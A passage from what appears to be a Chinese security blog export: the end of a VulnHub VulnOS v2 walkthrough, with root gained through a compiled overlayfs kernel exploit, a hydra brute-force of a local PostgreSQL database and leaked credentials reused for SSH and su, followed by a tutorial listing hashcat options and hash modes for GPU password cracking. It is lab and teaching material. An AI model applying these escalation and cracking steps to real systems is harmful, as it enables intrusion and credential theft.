37292.c</span><br></pre></td></tr></table></figure>

<p>编译并执行程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod 777 *</span><br><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .</span><br><span class="line">drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 37292.c</span><br><span class="line">$ gcc 37292.c -o shell</span><br><span class="line">$ ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwx  2 root   root    4096 Apr 20 05:30 .</span><br><span class="line">drwxr-xr-x 21 root   root    4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin  5119 Apr 20 05:28 37292.c</span><br><span class="line">-rwxrwxr-x  1 webmin webmin 12193 Apr 20 05:30 shell</span><br><span class="line">$ ./shell </span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(webmin)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">Hello and welcome.</span><br><span class="line">You successfully compromised the company <span class="string">&quot;JABC&quot;</span> and the server completely !!</span><br><span class="line">Congratulations !!!</span><br><span class="line">Hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you think of A.I.?</span><br></pre></td></tr></table></figure>

<p>成功得到root权限并获取了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub269.jpg"></li>
</ul>
<h3 id="其它getshell尝试"><a href="#其它getshell尝试" class="headerlink" title="其它getshell尝试"></a>其它getshell尝试</h3><p>使用之前的webmin账号密码登录web界面后，还可以添加上传文件的类型，从而上传php脚本文件</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub270.jpg"></li>
</ul>
<p>成功上传php脚本文件后，访问它发现脚本文件并不能被解析</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub271.jpg"></li>
</ul>
<h3 id="其它获取root权限的方法"><a href="#其它获取root权限的方法" class="headerlink" title="其它获取root权限的方法"></a>其它获取root权限的方法</h3><p>/home/webmin目录下有一个post.tar.gz文件</p>
<p>解压后似乎是“hydra”的复制品。这是为什么呢?<br>执行“netstat -antp”命令，会看到只有mysql(port3306)和postgresql(5432)数据库服务在本地运行，仅在127.0.0.1上运行。</p>
<p>有一个hydra的本地副本、一个密码bruteforcer和一个仅在本地运行的服务。<br>首先输入目录“post”，通过输入命令“<br>./在“make”后面加上“configure”。没有义务去做“安装”，取决于你。<br>make就可以了。<br>键入./hydra——帮助检查是否一切正常。</p>
<p>首先在端口5432上强制本地postgres数据库。<br>为了简单，使用metasploit-framework提供的字典列表“postgres_default_pass.txt”。<br>只需要在目标机器上获取字典列表。<br>本地攻击机器上启动apache webserver，将字典列表复制到公共html文件夹中，然后作为目标机器上的“webmin”用户进入shell。</p>
<p>然后启动hydra爆破</p>
<p>成功!现在知道postgresql数据库的用户凭证是postgres:posgtres。<br>仍然以“webmin”的身份登录到postgresql数据库，四处浏览。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\c system</span><br><span class="line"></span><br><span class="line">\dt</span><br><span class="line"></span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p>得到了username</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin</span><br></pre></td></tr></table></figure>

<p>password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c4nuh4ckm3tw1c3</span><br></pre></td></tr></table></figure>

<p>成功登录了ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vulnosadmin@192.168.56.104</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">vulnosadmin@192.168.56.104<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Mon Apr 20 05:11:47 CEST 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:           86</span></span><br><span class="line"><span class="string">  Usage of /:   5.8% of 29.91GB   Users logged in:     0</span></span><br><span class="line"><span class="string">  Memory usage: 16%               IP address for eth0: 192.168.56.104</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at:</span></span><br><span class="line"><span class="string">    https://landscape.canonical.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed May  4 19:35:16 2016 from 192.168.56.101</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOSv2:~$ id</span></span><br><span class="line"><span class="string">uid=1000(vulnosadmin) gid=1000(vulnosadmin) groups=1000(vulnosadmin),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOSv2:~$ whoami</span></span><br><span class="line"><span class="string">vulnosadmin</span></span><br></pre></td></tr></table></figure>

<p>在用户“vulnosadmin”的主目录中发现了一个奇怪的文件。</p>
<p>查看它，似乎是一个blender3D文件。Blender 3D是一款三维建模和动画制作软件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin@VulnOSv2:~$ ls</span><br><span class="line">r00t.blend</span><br></pre></td></tr></table></figure>

<p>如果在blender中打开文件，会看到一个3D立方体。以实模式显示。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub272.jpg"></li>
</ul>
<p>都得到了一个字符串，尝试用作root密码登录ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ab12fg//drg</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnosadmin@VulnOSv2:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@VulnOSv2:/home/vulnosadmin<span class="comment"># cd /root</span></span><br><span class="line">root@VulnOSv2:~<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@VulnOSv2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">Hello and welcome.</span><br><span class="line">You successfully compromised the company <span class="string">&quot;JABC&quot;</span> and the server completely !!</span><br><span class="line">Congratulations !!!</span><br><span class="line">Hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you think of A.I.?</span><br></pre></td></tr></table></figure>

<p>成功登录并得到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub273.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>OpenDocMan 1.2.7 cms sql注入（CVE-2014-1945）</li>
<li>Linux内核3.13.0 &lt; 3.19(Ubuntu 12.04/14.04/14.10/15.04)-“overlayfs”本地提权</li>
<li>hydra爆破postgresql数据库用户名和密码</li>
<li>blender软件查看.blender后缀3d建模文件以寻找root用户ssh密码</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>windows下hashcat利用GPU显卡性能破解密码</title>
    <url>/2019/10/22/windows-hashcat-insatll/</url>
    <content><![CDATA[<p><font color="green"><strong><em>由于一般密码破解工具的破解速度实在是太慢，而且支持的密码破解协议也不多，暴力破解的话，有的密码1年时间也破不出来，用字典跑的话必须要明文密码在字典里才行，而且密码字典太大的话，也很浪费时间，跑不出来也是很常见的事情，下面推荐一款世界上破解密码速度最快的工具，hashcat，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhc2hjYXQvaGFzaGNhdA==">hashcat github地址<i class="fa fa-external-link-alt"></i></span>,选择最新版的下载即可。</em></strong></font></p>
<h2 id="hashcat支持多种计算核心："><a href="#hashcat支持多种计算核心：" class="headerlink" title="hashcat支持多种计算核心："></a>hashcat支持多种计算核心：</h2><p>GPU<br>CPU<br>APU<br>DSP<br>FPGA<br>Coprocessor</p>
<a id="more"></a>

<h2 id="GPU的驱动要求"><a href="#GPU的驱动要求" class="headerlink" title="GPU的驱动要求"></a>GPU的驱动要求</h2><p>AMD GPUs on Linux require “RadeonOpenCompute (ROCm)” Software Platform (1.6.180 or later)<br>AMD GPUs on Windows require “AMD Radeon Software Crimson Edition” (15.12 or later)<br>Intel CPUs require “OpenCL Runtime for Intel Core and Intel Xeon Processors” (16.1.1 or later)<br>Intel GPUs on Linux require “OpenCL 2.0 GPU Driver Package for Linux” (2.0 or later)<br>Intel GPUs on Windows require “OpenCL Driver for Intel Iris and Intel HD Graphics”<br>NVIDIA GPUs require “NVIDIA Driver” (367.x or later)</p>
<h3 id="第一步：下载官方NVIDA驱动程序"><a href="#第一步：下载官方NVIDA驱动程序" class="headerlink" title="第一步：下载官方NVIDA驱动程序"></a>第一步：下载官方NVIDA驱动程序</h3><p>到<span class="exturl" data-url="aHR0cHM6Ly93d3cubnZpZGlhLmNuL0Rvd25sb2FkL2luZGV4LmFzcHg/bGFuZz1jbg==">NVIDA官网<i class="fa fa-external-link-alt"></i></span>下载与自己电脑显卡型号相对应的显卡驱动程序如图所示，然后根据提示一步步安装即可。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat1.jpg" alt="hashcat"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat2.jpg" alt="hashcat"></p>
<p>安装完成后，重启电脑即可。</p>
<p><font color="red">(NAVIDA的显卡只需要安装官方驱动即可，已经内含HASHCAT破解密码所需的GPU运算工具。记得使用上图官方下载的显卡驱动，不要使用windows自带的显卡驱动。)</font></p>
<h3 id="第二步：测试hashcat是否能利用gpu运算速度来破解密码"><a href="#第二步：测试hashcat是否能利用gpu运算速度来破解密码" class="headerlink" title="第二步：测试hashcat是否能利用gpu运算速度来破解密码"></a>第二步：测试hashcat是否能利用gpu运算速度来破解密码</h3><p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -b</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat3.jpg" alt="hashcat"><br>基准测试hashcat破解各种密码散列的速度。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -I</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat4.jpg" alt="hashcat"><br>检查设置如果已正确安装了GPU能够看到它并会列出其属性和使用的驱动程序信息。</p>
<p>破解examples:<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hashcat5.jpg" alt="hashcat"></p>
<h3 id="第三步：hashcat详细命令及使用"><a href="#第三步：hashcat详细命令及使用" class="headerlink" title="第三步：hashcat详细命令及使用"></a>第三步：hashcat详细命令及使用</h3><h2 id="普通"><a href="#普通" class="headerlink" title="普通"></a>普通</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-m, —<span class="built_in">hash</span>-type=NUM           哈希类别，其NUM值参考其帮助信息下面的哈希类别值，其值为数字。如果不指定m值则默认指md5，例如-m 1800是sha512 Linux加密。</span><br><span class="line"></span><br><span class="line">-a, –attack-mode=NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line"></span><br><span class="line">-V, —version                            版本信息</span><br><span class="line"></span><br><span class="line">-h, –<span class="built_in">help</span>                                   帮助信息。</span><br><span class="line"></span><br><span class="line">–quiet                                       安静的模式, 抑制输出</span><br></pre></td></tr></table></figure>
<h2 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-b, –benchmark                       测试计算机破解速度和显示硬件相关信息</span><br></pre></td></tr></table></figure>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">–hex-salt                         salt值是用十六进制给出的</span><br><span class="line"></span><br><span class="line">–hex-charset                  设定字符集是十六进制给出</span><br><span class="line"></span><br><span class="line">–runtime=NUM              运行数秒（NUM值）后的中止会话</span><br><span class="line"></span><br><span class="line">–status                            启用状态屏幕的自动更新</span><br><span class="line"></span><br><span class="line">–status-timer=NUM       状态屏幕更新秒值</span><br><span class="line"></span><br><span class="line">–status-automat             以机器可读的格式显示状态视图</span><br><span class="line"></span><br><span class="line">–session                         后跟会话名称，主要用于中止任务后的恢复破解。</span><br></pre></td></tr></table></figure>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-o,  –outfile=FILE                   定义哈希文件恢复输出文件</span><br><span class="line"></span><br><span class="line">–outfile-format=NUM            定义哈希文件输出格式，见下面的参考资料</span><br><span class="line"></span><br><span class="line">–outfile-autohex-disable       禁止使用十六进制输出明文</span><br><span class="line"></span><br><span class="line">-p,  –separator=CHAR         为哈希列表/输出文件定义分隔符字符</span><br><span class="line"></span><br><span class="line">–show                                     仅仅显示已经破解的密码</span><br><span class="line"></span><br><span class="line">–left                                         仅仅显示未破解的密码</span><br><span class="line"></span><br><span class="line">–username                            忽略<span class="built_in">hash</span>表中的用户名，对linux文件直接进行破解，不需要进行整理。</span><br><span class="line"></span><br><span class="line">–remove                                移除破解成功的<span class="built_in">hash</span>，当<span class="built_in">hash</span>是从文本中读取时有用，避免自己手工移除已经破解的<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">–stdout                                  控制台模式</span><br><span class="line"></span><br><span class="line">–potfile-disable                    不写入pot文件</span><br><span class="line"></span><br><span class="line">–debug-mode=NUM           定义调试模式（仅通过使用规则进行混合），参见下面的参考资料</span><br><span class="line"></span><br><span class="line">–debug-file=FILE                调试规则的输出文件（请参阅调试模式）</span><br><span class="line"></span><br><span class="line">-e, –salt-file=FILE                定义加盐文件列表</span><br><span class="line"></span><br><span class="line">–logfile-disable                    禁止logfile</span><br></pre></td></tr></table></figure>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c, –segment-size=NUM       字典文件缓存大小（M）</span><br><span class="line"></span><br><span class="line">-n, –threads=NUM                 线程数</span><br><span class="line"></span><br><span class="line">-s,  –words-skip=NUM          跳过单词数</span><br><span class="line"></span><br><span class="line">-l, –words-limit=NUM            限制单词数(分布式)</span><br></pre></td></tr></table></figure>
<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-r, –rules-file=FILE             使用规则文件: -r 1.rule，</span><br><span class="line"></span><br><span class="line">-g, –generate-rules=NUM       随机生成规则</span><br><span class="line"></span><br><span class="line">–generate-rules-func-min= 每个随机规则最小值</span><br><span class="line"></span><br><span class="line">–generate-rules-func-max=每个随机规则最大值</span><br><span class="line"></span><br><span class="line">–generate-rules-seed=NUM  强制RNG种子数</span><br></pre></td></tr></table></figure>
<h2 id="自定义字符集"><a href="#自定义字符集" class="headerlink" title="自定义字符集"></a>自定义字符集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-1,  –custom-charset1=CS  用户定义的字符集</span><br><span class="line"></span><br><span class="line">-2, –custom-charset2=CS  例如:</span><br><span class="line"></span><br><span class="line">-3, –custom-charset3=CS –custom-charset1=?dabcdef : 设置?1 为0123456789abcdef</span><br><span class="line"></span><br><span class="line">-4, –custom-charset4=CS   -2mycharset.hcchr : 设置 ?2 包含在mycharset.hcchr</span><br></pre></td></tr></table></figure>
<h2 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">–toggle-min=NUM              在字典中字母的最小值</span><br><span class="line"></span><br><span class="line">–toggle-max=NUM              在字典中字母的最大值</span><br><span class="line"></span><br><span class="line">–increment                   使用增强模式</span><br><span class="line"></span><br><span class="line">–increment-min=NUM          增强模式开始值</span><br><span class="line"></span><br><span class="line">–increment-max=NUM          增强模式结束值</span><br><span class="line"></span><br><span class="line">–perm-min=NUM                过滤比NUM数小的单词</span><br><span class="line"></span><br><span class="line">–perm-max=NUM               过滤比NUM数大的单词</span><br><span class="line"></span><br><span class="line">-t, –table-file=FILE             表文件</span><br><span class="line"></span><br><span class="line">    –table-min=NUM               在字典中的最小字符值</span><br><span class="line"></span><br><span class="line">    –table-max=NUM               在字典中的最大字符值</span><br><span class="line"></span><br><span class="line">–pw-min=NUM                  如果长度大于NUM，则打印候选字符</span><br><span class="line"></span><br><span class="line">–pw-max=NUM                 如果长度小于NUM，则打印候选字符</span><br><span class="line"></span><br><span class="line">–elem-cnt-min=NUM            每个链的最小元素数</span><br><span class="line"></span><br><span class="line">–elem-cnt-max=NUM            每个链的最大元素数</span><br><span class="line"></span><br><span class="line">–wl-dist-len                从字典表中计算输出长度分布</span><br><span class="line"></span><br><span class="line">–wl-max=NUM             从字典文件中加载NUM个单词，设置0禁止加载。</span><br><span class="line"></span><br><span class="line">–<span class="keyword">case</span>-permute             在字典中对每一个单词进行反转</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 = <span class="built_in">hash</span>[:salt]</span><br><span class="line"></span><br><span class="line">2 = plain 明文</span><br><span class="line"></span><br><span class="line">3 = <span class="built_in">hash</span>[:salt]:plain</span><br><span class="line"></span><br><span class="line">4 = hex_plain</span><br><span class="line"></span><br><span class="line">5 = <span class="built_in">hash</span>[:salt]:hex_plain</span><br><span class="line"></span><br><span class="line">6 = plain:hex_plain</span><br><span class="line"></span><br><span class="line">7 = <span class="built_in">hash</span>[:salt]:plain:hex_plain</span><br><span class="line"></span><br><span class="line">8 = crackpos</span><br><span class="line"></span><br><span class="line">9 = <span class="built_in">hash</span>[:salt]:crackpos</span><br><span class="line"></span><br><span class="line">10 = plain:crackpos</span><br><span class="line"></span><br><span class="line">11 = <span class="built_in">hash</span>[:salt]:plain:crackpos</span><br><span class="line"></span><br><span class="line">12 = hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">13 = <span class="built_in">hash</span>[:salt]:hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">14 = plain:hex_plain:crackpos</span><br><span class="line"></span><br><span class="line">15 = <span class="built_in">hash</span>[:salt]:plain:hex_plain:crackpos</span><br></pre></td></tr></table></figure>
<h2 id="调试模式输出文件-for-hybrid-mode-only-by-using-rules"><a href="#调试模式输出文件-for-hybrid-mode-only-by-using-rules" class="headerlink" title="调试模式输出文件 (for hybrid mode only, by using rules):"></a>调试模式输出文件 (for hybrid mode only, by using rules):</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 = save finding rule </span><br><span class="line"></span><br><span class="line">2 = save original word</span><br><span class="line"></span><br><span class="line">3 = save original word and finding rule</span><br><span class="line"></span><br><span class="line">4 = save original word, finding rule andmodified plain</span><br></pre></td></tr></table></figure>
<h2 id="内置的字符集"><a href="#内置的字符集" class="headerlink" title="内置的字符集:"></a>内置的字符集:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?l = abcdefghijklmnopqrstuvwxyz 代表小写字母</span><br><span class="line"></span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ 代表大写字母</span><br><span class="line"></span><br><span class="line">?d = 0123456789 代表数字</span><br><span class="line"></span><br><span class="line">?s = !”<span class="comment">#$%&amp;’()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~  代表特殊字符</span></span><br><span class="line"></span><br><span class="line">?a = ?l?u?d?s 大小写数字及特殊字符的组合</span><br><span class="line"></span><br><span class="line">?b = 0×00 – 0xff</span><br></pre></td></tr></table></figure>

<h2 id="攻击模式-1"><a href="#攻击模式-1" class="headerlink" title="攻击模式"></a>攻击模式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 = Straight （字典破解）</span><br><span class="line"></span><br><span class="line">1 = Combination （组合破解）</span><br><span class="line"></span><br><span class="line">2 = Toggle-Case （大小写转换）</span><br><span class="line"></span><br><span class="line">3 = Brute-force（掩码暴力破解）</span><br><span class="line"></span><br><span class="line">4 = Permutation（序列破解）</span><br><span class="line"></span><br><span class="line">5 = Table-Lookup（查表破解）</span><br><span class="line"></span><br><span class="line">6 = Hybrid dict + mask 字典加掩码破解</span><br><span class="line"></span><br><span class="line">7 = Hybrid mask + dict 掩码+字典破解</span><br><span class="line"></span><br><span class="line">8 = Prince（王子破解）</span><br></pre></td></tr></table></figure>

<h2 id="哈希类型"><a href="#哈希类型" class="headerlink" title="哈希类型"></a>哈希类型</h2><p>有关哈希具体值示例可以参考<span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC93aWtpL2Rva3UucGhwP2lkPWV4YW1wbGVfaGFzaGVz">网址<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0 = MD5</span><br><span class="line"></span><br><span class="line">  10 = md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  20 = md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  30 = md5(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  40 = md5(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  50 = HMAC-MD5 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  60 = HMAC-MD5 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  100 = SHA1</span><br><span class="line"></span><br><span class="line">  110 = sha1(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  120 = sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  130 = sha1(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  140 = sha1(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  150 = HMAC-SHA1 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  160 = HMAC-SHA1 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  200 = MySQL323</span><br><span class="line"></span><br><span class="line">  300 = MySQL4.1/MySQL5</span><br><span class="line"></span><br><span class="line">  400 = phpass, MD5(WordPress), MD5(phpBB3),MD5(Joomla)</span><br><span class="line"></span><br><span class="line">  500 = md5crypt, MD5(Unix), FreeBSD MD5,Cisco-IOS MD5</span><br><span class="line"></span><br><span class="line">  900 = MD4</span><br><span class="line"></span><br><span class="line">  1000 = NTLM</span><br><span class="line"></span><br><span class="line">  1100 = Domain Cached Credentials (DCC), MSCache</span><br><span class="line"></span><br><span class="line">  1400 = SHA256</span><br><span class="line"></span><br><span class="line">  1410 = sha256(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1420 = sha256(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1430 = sha256(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1431 = base64(sha256(unicode(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  1440 = sha256(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  1450 = HMAC-SHA256 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1460 = HMAC-SHA256 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1600 = md5apr1, MD5(APR), Apache MD5</span><br><span class="line"></span><br><span class="line">  1700 = SHA512</span><br><span class="line"></span><br><span class="line">  1710 = sha512(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1720 = sha512(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1730 = sha512(unicode(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1740 = sha512(<span class="variable">$salt</span>.unicode(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  1750 = HMAC-SHA512 (key = <span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  1760 = HMAC-SHA512 (key = <span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  1800 = SHA-512(Unix)</span><br><span class="line"></span><br><span class="line">  2400 = Cisco-PIX MD5</span><br><span class="line"></span><br><span class="line">  2410 = Cisco-ASA MD5</span><br><span class="line"></span><br><span class="line">  2500 = WPA/WPA2</span><br><span class="line"></span><br><span class="line">  2600 = Double MD5</span><br><span class="line"></span><br><span class="line">  3200 = bcrypt, Blowfish(OpenBSD)</span><br><span class="line"></span><br><span class="line">  3300 = MD5(Sun)</span><br><span class="line"></span><br><span class="line">  3500 = md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  3610 = md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  3710 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  3720 = md5(<span class="variable">$pass</span>.md5(<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  3800 = md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  3910 = md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  4010 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4110 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  4210 = md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  4300 = md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  4400 = md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4500 = Double SHA1</span><br><span class="line"></span><br><span class="line">  4600 = sha1(sha1(sha1(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  4700 = sha1(md5(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4800 = MD5(Chap), iSCSI CHAP authentication</span><br><span class="line"></span><br><span class="line">  4900 = sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  5000 = SHA-3(Keccak)</span><br><span class="line"></span><br><span class="line">  5100 = Half MD5</span><br><span class="line"></span><br><span class="line">  5200 = Password Safe SHA-256</span><br><span class="line"></span><br><span class="line">  5300 = IKE-PSK MD5</span><br><span class="line"></span><br><span class="line">  5400 = IKE-PSK SHA1</span><br><span class="line"></span><br><span class="line">  5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS</span><br><span class="line"></span><br><span class="line">  5600 = NetNTLMv2</span><br><span class="line"></span><br><span class="line">  5700 = Cisco-IOS SHA256</span><br><span class="line"></span><br><span class="line">  5800 = Android PIN</span><br><span class="line"></span><br><span class="line">  6300 = AIX &#123;smd5&#125;</span><br><span class="line"></span><br><span class="line">  6400 = AIX &#123;ssha256&#125;</span><br><span class="line"></span><br><span class="line">  6500 = AIX &#123;ssha512&#125;</span><br><span class="line"></span><br><span class="line">  6700 = AIX &#123;ssha1&#125;</span><br><span class="line"></span><br><span class="line">  6900 = GOST, GOST R 34.11-94</span><br><span class="line"></span><br><span class="line">  7000 = Fortigate (FortiOS)</span><br><span 